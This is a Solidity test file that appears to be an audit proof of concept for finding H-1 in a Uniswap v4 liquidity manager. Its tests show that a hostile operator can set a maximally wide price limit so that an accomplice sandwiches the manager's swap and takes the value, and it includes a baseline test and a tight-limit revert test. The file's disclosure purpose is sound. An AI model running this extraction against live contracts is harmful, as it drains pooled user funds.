// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {StableLPTestBase} from "./helpers/StableLPTestBase.sol";
import {StableLPManager} from "../src/StableLPManager.sol";
import {BaseLPManager} from "../src/BaseLPManager.sol";
import {MockERC20} from "./helpers/Mocks.sol";

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";

/// @notice PoC for audit finding **H-1**: the pre-swap in `allocate` / `reinvest` is protected ONLY by
/// the operator-supplied `sqrtPriceLimitX96`. Because `allocate`/`reinvest` are `onlyAuthorized`
/// (operator OR owner), a malicious / compromised operator can pass a maximally-wide price limit and
/// route the manager's capital through an adverse in-pool swap that a confederate sandwiches —
/// economically extracting value despite the "operators cannot move capital out" invariant.
///
/// The three tests together form the proof:
///  1. `test_H1_baseline_pureSandwich_attackerLoses` — a front-run/back-run round trip on a STATIC pool
///     loses money (pays the pool fee twice). So any attacker profit below must come from the victim.
///  2. `test_H1_operatorWideLimitSwap_extractsValueToAttacker` — with the operator's unprotected swap
///     in the middle, the SAME sandwich now turns a profit, paid out of the manager's bad execution.
///  3. `test_H1_tightLimit_wouldHaveReverted` — a tight `swapPriceLimit` reverts the adverse swap, i.e.
///     the protection EXISTS but is operator-chosen; the contract does not enforce it.
contract StableLPManagerH1OperatorExtractionPoC is StableLPTestBase {
    using StateLibrary for IPoolManager;

    PoolSwapTest internal swapRouter;
    address internal attacker = address(0xA77AC);

    // Pool 0 is sorted(USDT, USDC). Manager + attacker trade USDT <-> USDC there.
    uint8 internal constant P = 0;
    bool internal usdtIsZero;

    uint256 internal constant FRONT_RUN = 300_000e18; // attacker skews the pool
    uint256 internal constant VICTIM_SWAP = 300_000e18; // operator routes manager capital through it
    uint256 internal constant MGR_TOPUP = 1_000_000e18; // extra USDT for the manager to swap

    function setUp() public override {
        super.setUp();
        usdtIsZero = Currency.unwrap(poolKeys[P].currency0) == Currency.unwrap(USDT);

        swapRouter = new PoolSwapTest(IPoolManager(address(poolManager)));
        MockERC20(Currency.unwrap(USDT)).mint(attacker, 5_000_000e18);
        MockERC20(Currency.unwrap(USDC)).mint(attacker, 5_000_000e18);
        vm.startPrank(attacker);
        MockERC20(Currency.unwrap(USDT)).approve(address(swapRouter), type(uint256).max);
        MockERC20(Currency.unwrap(USDC)).approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();

        // Top the manager up so the operator has a large balance to push through the bad swap.
        MockERC20(Currency.unwrap(USDT)).mint(address(mgr), MGR_TOPUP);

        // Delegate operational rights to the (now hostile) bot.
        vm.prank(owner);
        mgr.setOperator(bot, true);
    }

    // ────────── helpers ──────────

    function _attackerSwapExactIn(bool zeroForOne, uint256 amountIn) internal {
        vm.prank(attacker);
        swapRouter.swap(
            poolKeys[P],
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn),
                sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    /// @dev A single-leg allocate that mostly just swaps `VICTIM_SWAP` USDT -> USDC with a WIDE price
    /// limit (the only protection — chosen wide by the hostile operator). Tiny LP add so the swap is
    /// what moves value; the swap output settles back to manager idle.
    function _wideLimitLeg(uint160 limit) internal view returns (BaseLPManager.AllocLeg memory leg) {
        leg = BaseLPManager.AllocLeg({
            poolId: poolKeys[P].toId(),
            zeroForOne: usdtIsZero, // input side is the USDT the manager holds
            swapAmountIn: VICTIM_SWAP,
            swapPriceLimit: limit,
            amount0Desired: 1e18,
            amount1Desired: 1e18,
            minLiquidity: 0
        });
    }

    function _wideLimit() internal view returns (uint160) {
        return usdtIsZero ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;
    }

    function _attackerStableValue() internal view returns (uint256) {
        return _bal(USDT, attacker) + _bal(USDC, attacker);
    }

    /// @dev Attacker front-runs (USDT->USDC), then (optionally a victim swap happens), then back-runs
    /// the USDC it just acquired (USDC->USDT). Returns the attacker's net PnL in summed stable units.
    function _runSandwich(bool withVictimSwap) internal returns (int256 pnl) {
        uint256 start = _attackerStableValue();

        uint256 usdcBeforeFront = _bal(USDC, attacker);
        _attackerSwapExactIn(usdtIsZero, FRONT_RUN); // USDT -> USDC
        uint256 acquired = _bal(USDC, attacker) - usdcBeforeFront;

        if (withVictimSwap) {
            vm.prank(bot);
            mgr.allocate(_oneLeg(_wideLimitLeg(_wideLimit())));
        }

        _attackerSwapExactIn(!usdtIsZero, acquired); // USDC -> USDT (unwind)

        pnl = int256(_attackerStableValue()) - int256(start);
    }

    function _oneLeg(BaseLPManager.AllocLeg memory leg) internal pure returns (BaseLPManager.AllocLeg[] memory legs) {
        legs = new BaseLPManager.AllocLeg[](1);
        legs[0] = leg;
    }

    // ────────── tests ──────────

    /// Baseline: a pure sandwich on a static pool is unprofitable (double pool fee + symmetric impact).
    function test_H1_baseline_pureSandwich_attackerLoses() public {
        int256 pnl = _runSandwich(false);
        assertLt(pnl, int256(0), "pure round-trip must lose money on a static pool");
    }

    /// The vulnerability: the operator's wide-limit swap converts that loss into a profit for the
    /// attacker — value extracted from the manager, despite operators being unable to call withdrawTo.
    function test_H1_operatorWideLimitSwap_extractsValueToAttacker() public {
        int256 pnl = _runSandwich(true);
        emit log_named_int("attacker PnL (stable units)", pnl);
        assertGt(pnl, int256(0), "attacker profited");
        // Material, not dust: > 1000 tokens (~$1000) siphoned out of the manager.
        assertGt(pnl, int256(1_000e18), "extraction is material");
    }

    /// The protection exists but is operator-chosen: a tight price limit reverts the adverse swap
    /// (either the manager's own `SwapSlippage` partial-fill guard, or v4-core's price-limit guard).
    /// A tight limit at the (already skewed) current price leaves no room for the input to fill — so
    /// an HONEST operator is protected, but a hostile one simply omits the protection (see the
    /// extraction test above, which passes a maximally-wide limit).
    function test_H1_tightLimit_wouldHaveReverted() public {
        _attackerSwapExactIn(usdtIsZero, FRONT_RUN); // skew the pool first

        (uint160 nowP,,,) = IPoolManager(address(poolManager)).getSlot0(poolKeys[P].toId());
        // Tight limit == current price ⇒ the USDT->USDC swap can't move ⇒ revert (no value lost).
        vm.prank(bot);
        vm.expectRevert();
        mgr.allocate(_oneLeg(_wideLimitLeg(nowP)));
    }
}
